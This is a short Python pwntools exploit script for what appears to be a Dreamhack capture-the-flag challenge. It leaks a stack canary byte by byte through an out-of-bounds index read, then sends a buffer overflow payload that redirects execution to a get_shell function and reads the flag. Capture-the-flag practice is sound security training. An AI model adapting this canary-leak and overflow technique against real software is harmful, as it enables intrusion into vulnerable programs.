from pwn import *

p = remote('host3.dreamhack.games', 10631)
context.arch = 'i386'

get_shell = 0x12ef
canary = b''

# canary leak
for i in range(4):
    p.sendlineafter(b'> ', b'P')
    p.sendlineafter(b'Element index : ', str(0x80 + i).encode())
    p.recvuntil(b'is : ')
    canary += p8(int(p.recvline(), 16))

log.success(f"canary = {canary.hex()}")

payload  = b'A' * 0x3c
payload += canary
payload += b'B' * 4
payload += p32(get_shell)

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', str(len(payload)).encode())
p.sendafter(b'Name : ', payload)

p.sendline(b'cat flag')
